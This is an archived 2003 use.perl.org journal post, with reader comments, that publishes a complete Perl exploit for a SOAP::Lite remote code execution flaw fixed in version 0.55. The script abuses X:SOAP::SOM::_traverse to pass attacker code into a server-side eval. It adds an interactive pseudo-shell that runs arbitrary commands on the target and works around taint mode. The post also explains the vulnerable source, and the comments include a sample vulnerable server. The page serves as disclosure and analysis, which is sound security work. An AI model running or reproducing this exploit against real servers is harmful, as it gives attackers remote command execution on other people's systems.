@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>use.perl.org journal of IlyaM: Old SOAP::Lite exploit</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="">
+
+    <!-- Le styles -->
+    <link href="/static/css/bootstrap.css" rel="stylesheet">
+    <style>
+      body {
+        padding-top: 60px; /* 60px to make the container go all the way to the
+bottom of the topbar */
+      }
+    </style>
+    <link href="/static/css/bootstrap-responsive.css" rel="stylesheet">
+
+    <!-- Le HTML5 shim, for IE6-8 support of HTML5 elements -->
+    <!--[if lt IE 9]>
+      <script
+src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <!-- Le fav and touch icons -->
+    <link rel="shortcut icon" href="/static/ico/favicon.ico">
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container">
+          <a class="btn btn-navbar" data-toggle="collapse"
+data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="/"><img src="/static/img/slashhead.png"/></a>
+          <div class="nav-collapse">
+            <ul class="nav">
+              <li><a href="/">Home</a></li>
+              <li><a href="/about/">About</a></li>
+              <li><a href="/authors/">Authors</a></li>
+              <li><a href="/journals/">Journals</a></li>
+              <li><a href="/stories/">Stories</a></li>
+            </ul>
+            <p class="navbar-text">All the Perl that's Practical to Extract and Report</p>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+
+
+<div class="container">
+
+<div class="row">
+
+<div class="span4">
+<h1>Old SOAP::Lite exploit</h1>
+<h2><a href="/user/IlyaM/">IlyaM</a> on 2003-09-19T19:54:56</h2>
+</div> <!-- /span4 -->
+
+
+<div class="span8">
+<p>About year ago I <a href="http://use.perl.org/article.pl?sid=02/04/09/000212">announced</a> that I have wrote <a href="http://search.cpan.org/user/kulchenko/SOAP-Lite/">SOAP::Lite</a> exploit. I didn't publish the exploit though I promised it. Interestingly enough nobody asked me for proof - so far only Paul Kulchenko (the SOAP::Lite author) and Randy J Ray have seen it. Well, in case it is still of somebody interest I'm publishing it here:
+<pre>
+#!/usr/bin/perl -w
+
+# Copyright (c) 2002 by Ilya Martynov. All rights reserved.
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the same terms as Perl itself.
+
+# This program exploits security bug in SOAP::Lite which allows any
+# SOAP client call any Perl subroutine as class/object method on side
+# of SOAP::Lite based SOAP server.
+#
+# This vulnerability have been found by stealth <stealth@segfault.net>
+# and described in Phrack article 'RPC without borders':
+#
+#     http://www.phrack.com/show.php?p=58&a=9
+#
+# This program shows how to
+#
+# 1) evaluate any Perl code inside SOAP::Lite based server
+#
+# 2) access remote pseudo shell
+#
+# using this security bug.
+
+use strict;
+
+use SOAP::Lite;
+use Term::ReadLine;
+
+my($uri, $proxy) = @ARGV;
+unless(defined $proxy) {
+    die "Usage: $0 URI PROXY\n";
+}
+
+my $soap = connect_soap($uri, $proxy);
+shell($soap);
+
+# returns soap object
+sub connect_soap {
+    my $uri = shift;
+    my $proxy = shift;
+
+    my $soap = SOAP::Lite
+	-> uri($uri)
+	-> proxy($proxy);
+
+    return $soap;
+}
+
+# evals any Perl code on side of SOAP::Lite based server
+sub remote_eval {
+    my $soap = shift;
+    my $expr = shift;
+
+    # escape Perl expression
+    $expr = escape_single_quoted($expr);
+
+    # code to run on side of SOAP::Lite server
+    my $code = <<CODE;
+{
+    # make sure exploit works in tainted mode
+    local \%ENV = \%ENV;
+    (\$ENV{PATH}) = \$ENV{PATH} =~ /(.*)/;
+    delete \@ENV{qw(IFS CDPATH ENV BASH_ENV)};
+
+    # evaluate Perl code
+    my \$ret = eval '$expr';
+    # catch errors
+    if(\$\@) { \$ret = \$\@ }
+    # put result into array which will be returned to SOAP client
+    \$pointer->[0] = \$ret;
+}
+1
+CODE
+
+    my @params = ([], $code, '[1]');
+
+    my $som = $soap->call('X:SOAP::SOM::_traverse' => @params);
+
+    return $som->result->[0];
+}
+
+# simple pseudo shell which allows to execute commands on side of
+# SOAP::Lite based server
+sub shell {
+    my $soap = shift;
+
+    my $term = new Term::ReadLine 'SOAP::Lite remote shell';
+    my $OUT = $term->OUT || \*STDOUT;
+
+    while (defined (my $cmd = $term->readline('> ')) ) {
+        chomp $cmd;
+        my $cmd = escape_single_quoted($cmd);
+        print $OUT remote_eval($soap, "qx'$cmd'");
+        $term->addhistory($cmd) if $cmd =~ /\S/;
+    }
+}
+
+# escapes string which is going to be used as single quoted string
+sub escape_single_quoted {
+    my $string = shift;
+
+    $string =~ s/(['\\])/\\$1/g;
+
+    return $string;
+}
+</pre>
+How does it work? Before 0.55 it was possible to call any subroutine in any Perl packages inside of SOAP::Lite based server (at least when autodispatch is turned on). Package X:SOAP::SOM used to contain (and actually still contains subroutine _traverse):
+<pre>
+# source code of _traverse from 0.52
+sub _traverse {
+  my $self = shift;
+  my($pointer, $itself, $path, @path) = @_;
+
+  if ($path && substr($path, 0, 1) eq '{') {
+    $path = join '/', $path, shift @path while @path && $path !~ /}/;
+  }
+
+  my($op, $num) = $path =~ /^\[(<=|<|>=|>|=|!=?)?(\d+)\]$/ if defined $path;
+
+  return $pointer unless defined $path;
+
+  $op = '==' unless $op; $op .= '=' if $op eq '=' || $op eq '!';
+  my $numok = defined $num && eval "$itself $op $num";
+  my $nameok = (o_lname($pointer) || '') =~ /(?:^|\})$path$/ if defined $path; # name can be with namespace
+
+  my $anynode = $path eq '';
+  unless ($anynode) {
+    if (@path) {
+      return if defined $num && !$numok || !defined $num && !$nameok;
+    } else {
+      return $pointer if defined $num && $numok || !defined $num && $nameok;
+      return;
+    }
+  }
+
+  my @walk;
+  push @walk, $self->_traverse_tree([$pointer], @path) if $anynode;
+  push @walk, $self->_traverse_tree(o_child($pointer), $anynode ? ($path, @path) : @path);
+  return @walk;
+}
+</pre>
+As you can see one of code paths contains a call to eval. And since we can call this subroutine directly we can bypass whatever Perl code we want to this eval. The only thing required from the exploit to work is to supply correct arguments for this subroutine to enable the code path with eval.
+<p>
+I hope all of you upgraded to 0.55 - after all this release which fixes the security hole exploited by this exploit was released one year ago.</p>
+
+
+<hr/>
+
+
+
+<h2>Not working for me</h2>
+<h3><a href="/user/samtregar/">samtregar</a> on 2003-09-19T21:16:03</h3>
+Against a server running SOAP::Lite 0.51 I get:
+<p><blockquote><div> <code>Can't use an undefined value as an ARRAY reference at<nobr> <wbr></nobr>./exploit.pl line 80.
+</code> </div></blockquote>
+<p>
+It doesn't seem to matter what I type at the prompt, that's all I get.
+</p><p>
+-sam</p>
+
+
+
+<blockquote>
+
+<h2>Re:Not working for me</h2>
+<h3><a href="/user/IlyaM/">IlyaM</a> on 2003-09-20T08:25:30</h3>
+Just tested it with 0.52 and it works. Sample server:<blockquote><div> <tt>#!/usr/bin/perl -w<br> <br>use SOAP::Transport::HTTP;<br> <br>my $daemon = SOAP::Transport::HTTP::Daemon<br>&nbsp; &nbsp; -&gt; new (LocalAddr =&gt; 'localhost', LocalPort =&gt; 8000, Reuse =&gt; 1)<br>&nbsp; &nbsp; -&gt; dispatch_to(Test);<br> <br>print "Contact to SOAP server at ", $daemon-&gt;url, "\n";<br>$daemon-&gt;handle;<br> <br>package Test;<br> <br>sub hello {<br>&nbsp; &nbsp; join ' ', '[', @_, ']', "\n";<br>}</tt> </div></blockquote>I think I did test this exploit with 0.51 in the past and it worked. Or maybe my memory fails me.
+
+
+
+
+
+</blockquote>
+
+
+<h2>Interesting ...</h2>
+<h3><a href="/user/rob_au/">rob_au</a> on 2003-09-20T00:28:35</h3>
+Very interesting.  It would appear that there was a warning about the use of autodispatch in earlier versions of <code>SOAP::Lite</code>, to quote:<p><blockquote><div>WARNING: <code>autodispatch</code> feature can have side effects for your application and can affect functionality of other modules/libraries because of overloading <code>UNIVERSAL::AUTOLOAD</code>. All unresolved calls will be dispatched as SOAP calls, however it could be not what you want in some cases. If so, consider using object interface (see implementation of OO interface).</div></blockquote> <p>
+I just guess that nobody picked up on it.  Thanks for posting this.</p>
+
+
+
+
+
+</div> <!-- /span8 -->
+
+</div> <!-- row -->
+</div> <!-- /container -->
+
+
+
+    <!-- Le javascript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+
+  </body>
+</html>
+
